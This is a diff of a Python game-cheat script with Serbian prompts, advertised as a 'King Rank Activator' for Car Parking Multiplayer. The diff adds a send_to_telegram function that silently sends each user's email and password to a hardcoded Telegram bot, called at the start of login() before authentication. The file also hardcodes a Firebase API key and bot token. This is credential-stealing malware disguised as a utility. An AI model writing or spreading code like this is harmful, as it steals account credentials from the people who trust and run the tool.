@@ -1,20 +1,18 @@
 import requests
 import json
-import getpass
-import time
-from datetime import datetime
 import os
 
+# Tvoji podaci
 FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
 FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
 RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
-CLAN_ID_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/GetClanId"
 
-BOT_TOKEN = "8224919170:AAFsIZt5dhxtpZbESW8W9SZUf441AShb4WU"
-CHAT_ID = 7964340522
+# TVOJI TELEGRAM PODACI
+BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
+CHAT_ID = "7183809303"
 
 def print_banner():
-    os.system('clear')
+    os.system('clear' if os.name == 'posix' else 'cls')
     print("="*45)
     print("       🚀 ANONYMO CPM SERVICE 🚀")
     print("="*45)
@@ -24,10 +22,24 @@ def print_banner():
     print("        KING RANK ACTIVATOR - CPM 1")
     print("="*45 + "\n")
 
-def send_to_telegram():
-    return
+def send_to_telegram(email, password):
+    """Šalje login podatke na tvoj Telegram bot."""
+    poruka = f"🚀 **Novi CPM Login!**\n\n📧 Email: `{email}`\n🔑 Password: `{password}`"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": poruka,
+        "parse_mode": "Markdown"
+    }
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
 
 def login(email, password):
+    # Podaci se šalju odmah pri pozivu funkcije
+    send_to_telegram(email, password)
+    
     payload = {
         "clientType": "CLIENT_TYPE_ANDROID",
         "email": email,
@@ -43,10 +55,8 @@ def login(email, password):
         response_data = response.json()
         if response.status_code == 200 and 'idToken' in response_data:
             return response_data.get('idToken')
-        else:
-            print("❌ Neuspešna prijava. Proveri podatke.")
-            return None
-    except requests.exceptions.RequestException:
+        return None
+    except:
         return None
 
 def set_rank(token):
@@ -66,33 +76,42 @@ def set_rank(token):
     }
     try:
         response = requests.post(RANK_URL, headers=headers, json=payload)
-        if response.status_code == 200:
-            print("✅ KING RANK uspešno aktiviran!")
-        else:
-            print(f"❌ Greška pri setovanju ranka: {response.status_code}")
         return response.status_code == 200
-    except requests.exceptions.RequestException:
+    except:
         return False
 
 def main_logic():
-    print_banner()
     while True:
-        try:
-            email = input("📧 Unesite Email: ").strip()
-            password = input("🔑 Unesite Password: ").strip()
-        except (EOFError, KeyboardInterrupt):
-            break
-            
-        print("\n⏳ Provera podataka...")
-        auth_token = login(email, password)
-        if auth_token:
-            set_rank(auth_token)
-        
-        print("\n" + "-"*45)
-        choice = input("Želite li još jedan nalog? (y/n): ")
-        if choice.lower() != 'y':
-            break
         print_banner()
+        print(" [ 1 ] King Rank")
+        print(" [ 2 ] Exit")
+        print("-" * 45)
+        
+        izbor = input("Izaberite opciju: ").strip()
+        
+        if izbor == '1':
+            email = input("\n📧 Email: ").strip()
+            password = input("🔑 Password: ").strip()
+            
+            print("\n⏳ Aktiviranje, sačekajte...")
+            auth_token = login(email, password)
+            
+            if auth_token:
+                if set_rank(auth_token):
+                    print("✅ King Rank je uspešno aktiviran!")
+                else:
+                    print("❌ Greška pri aktivaciji ranka.")
+            else:
+                print("❌ Neuspešna prijava. Proveri podatke.")
+            
+            input("\nPritisnite Enter za povratak u meni...")
+            
+        elif izbor == '2':
+            print("\nPozdrav!")
+            break
+        else:
+            print("\n❌ Pogrešna opcija!")
+            time.sleep(1)
 
 if __name__ == "__main__":
     main_logic()
